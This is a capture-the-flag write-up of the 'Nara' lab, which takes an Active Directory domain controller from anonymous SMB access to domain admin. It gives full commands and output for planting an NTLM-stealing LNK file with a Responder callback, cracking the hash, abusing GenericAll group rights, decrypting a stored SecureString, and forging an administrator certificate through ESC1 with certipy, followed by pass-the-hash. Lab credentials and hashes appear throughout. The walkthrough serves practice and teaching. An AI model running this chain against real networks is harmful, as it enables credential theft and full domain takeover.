---
description: Owed DC using Misconfigured Certificate Templates - ESC1
---

# Nara

## Summary

* Anonymous Read and Write was enabled in the/Nara directory via SMB.
  * Found an important.txt file that indicates every employee to check the Documents folder regularly.
* Having write access, we can upload INK file and grab the NTML hash of users.
  * uploaded a file, and got NTML hash on <mark style="color:yellow;">Responder</mark>
  * Decrypted the hash to get plain text password
* Bloodhound revealed that Tracy had <mark style="color:red;">GenericAll</mark> privileges to Remote Access Group.&#x20;
* Got the winrm access to the machine after adding Tracy to the Remote Access group.&#x20;
* found a secured encrypted secret int he box which was later decrypted get plan text password.&#x20;
* it turns out DC had a CA, so we can attempt to perform domain escalation using <mark style="color:red;">Misconfigured Certificate Templates - ESC1</mark>&#x20;

## Let's Unpack

### Enumeration

Using SMBClient (unauth) to enumeration /nara directory

<pre class="language-bash"><code class="lang-bash">smbclient -N -L  //192.168.181.30//                   

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
       <a data-footnote-ref href="#user-content-fn-1"> nara            Disk      company share</a>
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
  
 smb: > ls
  .                                   D        0  Sun Jul 30 16:31:58 2023
  ..                                DHS        0  Sun Jul 30 16:46:51 2023
  Documents                           D        0  Sun Jul 30 16:03:13 2023
  Important.txt                       A     2200  Sun Jul 30 16:05:31 2023
  IT                                  D        0  Sun Jul 30 18:22:50 2023    
</code></pre>

### Initial Foothold

`Important.txt` indicates that every employee should regularly check the Documents folder regularly (for new compliance documents). Since we have write access, we can plan an attack here.

* Create a malicious INK file using the [<mark style="color:red;">ntml\_theft</mark>](https://github.com/Greenwolf/ntlm\_theft) tool.
* Spin up responder to get a callback from victim having their NTML hash.
* Crack the hash to get the password in plaintext.

```bash
# I used ntlm_theft to generate INK file
git clone https://github.com/Greenwolf/ntlm_theft.git

# Generating INK file
python ntlm_theft.py -g lnk -s 192.168.45.244 -f install

# Spinning up Responder
sudo responder -I tun0 -w -d

# --- GOT THE Callback
[SMB] NTLMv2-SSP Username : NARASEC\Tracy.White
[SMB] NTLMv2-SSP Hash     : Tracy.White::NARASEC:9f6ebeb2d288290f:2821EB40717F2B99D6002341D898F366:010100000000000080C092A109CDDA010027ECCFA644DA070000000002000800570042004500420001001E00570049004E002D0055005900490042004F0055003100350036005500580004003400570049004E002D0055005900490042004F005500310035003600550058002E0057004200450042002E004C004F00430041004C000300140057004200450042002E004C004F00430041004C000500140057004200450042002E004C004F00430041004C000700080080C092A109CDDA0106000400020000000800300030000000000000000100000000200000A3997A8A7B1743AD761ADC64B3BC9709BB0BC9181F018B9F8D29F8200E3123F30A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200340034000000000000000000  

# Cracking the hash using John
john --wordlist=/usr/share/wordlists/rockyou.txt hash

# anddd we have creds in plain text
Tracy.White
zqwj041FGX

```

Remote access is not enabled for this user, so these credentials cannot be used to gain entry into the box. Let's keep digging!

Let's use bloodhound-python to get more vectors on lateral movement.

```bash
bloodhound-python -d nara-security.com -u Tracy.White -p zqwj041FGX -ns 192.168.181.30 -c All
```

#### Findings of BloodHound

* TRACY.WHITE@NARA-SECURITY.COM has <mark style="color:red;">GenericAll</mark> privileges to the group REMOTE ACCESS@NARA-SECURITY.COM

<figure><img src="../.gitbook/assets/Screenshot 2024-07-07 at 1.45.36 PM.png" alt=""><figcaption></figcaption></figure>

To abuse this permission, we can add ourselves to the `Remote Access Group` and gain an initial foothold into the machine via winrm

```bash
# using `net rpc` to add Tracy into Remote Access Group
net rpc group addmem 'Remote Access' 'Tracy.White' -U nara-security.com/'Tracy.White' -S 192.168.181.30

# Double-check if the user has been added
net rpc group members "Remote Access"  -U nara-security.com/'Tracy.White'-S 192.168.191.30
>
Password for [NARA-SECURITY.COM\Tracy.White]:
NARASEC\Jodie.Summers
NARASEC\Tracy.White

```

Now we can <mark style="color:red;">winrm</mark> into the machine.

```bash
evil-winrm -u tracy.white -i nara.nara-security.com

# BOOM! got non-privilege flag -> user.txt
```



Got a file in automation.txt in "C:Users\Tracy.White\Documents".

```powershell
Enrollment Automation Account

01000000d08c9ddf0115d1118c7a00c04fc297eb0100000001e86ea0aa8c1e44ab231fbc46887c3a0000000002000000000003660000c000000010000000fc73b7bdae90b8b2526ada95774376ea0000000004800000a000000010000000b7a07aa1e5dc859485070026f64dc7a720000000b428e697d96a87698d170c47cd2fc676bdbd639d2503f9b8c46dfc3df4863a4314000000800204e38291e91f37bd84a3ddb0d6f97f9eea2b

```

This appear to be a encrypted password. We can use this script to decrypt it

```powershell
$pwd = Get-Content cred.txt | ConvertTo-SecureString
[System.Net.NetworkCredential]::new("", $pwd).Password


# Got password in plain text
hHO_S9gff7ehXw

# Using cme to check which user this password belong to 
crackmapexec smb 192.168.45.244 -u user.txt -p 'hHO_S9gff7ehXw' --continue-on-success

# Got the user 
jodie.summers
hHO_S9gff7ehXw
```

Sadly, this user had no interesting misconfiguration listed by Bloodhound :(

### Privilege Escalation/Lateral Movement

_<mark style="color:purple;">From here, I had to refer to Walkthrough for further impersonating privilege as an administrator</mark>._ :crying\_cat\_face:

It turns out there is a CA on a Domain Controller. We can use [<mark style="color:yellow;">certipy-ad</mark> ](https://github.com/ly4k/Certipy)to get more vector of lateral movement.

<pre class="language-bash"><code class="lang-bash"><strong># We need to use -old-bloodhound flag so we can import the json or ZIP
</strong><strong># into bloodhound UI
</strong><strong>certipy-ad find -u JODIE.SUMMERS -p 'hHO_S9gff7ehXw' -dc-ip nara-security.com  -dns-tcp -ns 172.16.201.26 -bloodhound
</strong>
</code></pre>

BloodHound UI shows that the Enrollment group as <mark style="color:red;">GenericAll</mark> on the <mark style="color:red;">NARAUSER</mark> template, which is also known as the <mark style="color:red;">ESC4</mark> scenario (full control over a template). Additionally, any user-supplied subject is allowed, so it is also <mark style="color:red;">directly vulnerable to ESC1</mark> from any user in the enrollment group.

<figure><img src="../.gitbook/assets/Screenshot 2024-07-07 at 2.18.21 PM.png" alt=""><figcaption></figcaption></figure>

Read more about this class of vulnerability here

{% embed url="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation" %}

```bash
# Let's impersonate the admin
certipy-ad req -username JODIE.SUMMERS -password 'hHO_S9gff7ehXw' \n
-target nara-security.com -ca NARA-CA -template NARAUSER \n
-upn administrator@nara-security.com -dc-ip 192.168.172.30 -debug

>
...
[*] Saved certificate and private key to 'administrator.pfx'


certipy auth -pfx administrator.pfx -domain nara-security.com -username administrator -dc-ip 172.16.201.26
...
[*] Got hash for 'administrator@nara-security.com': aad3b435b51404eeaad3b435b51404ee:d35c4ae45bdd10a4e28ff529a2155745


# For me, I was getting the following error, which could be due to
# some problem in the machine.
sudo certipy-ad req -username JODIE.SUMMERS -password 'hHO_S9gff7ehXw' -target nara-security.com -ca NARA-CA -template NARAUSER -upn administrator@nara-security.com -dc-ip 192.168.172.30 -debug
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'nara-security.com' at '192.168.172.30'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:192.168.172.30[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.172.30[\pipe\cert]
[-] Got error while trying to request certificate: code: 0x80092013 - CRYPT_E_REVOCATION_OFFLINE - The revocation function was unable to check revocation because the revocation server was offline.
[*] Request ID is 10
Would you like to save the private key? (y/N) 
[-] Failed to request certificate

```

We can now use this hash to move laterally into a machine impersonating an administrator.

```bash
evil-winrm -u administrator -i nara-security.com -H d35c4ae45bdd10a4e28ff529a2155745
```



[^1]: Had Read/Write Access
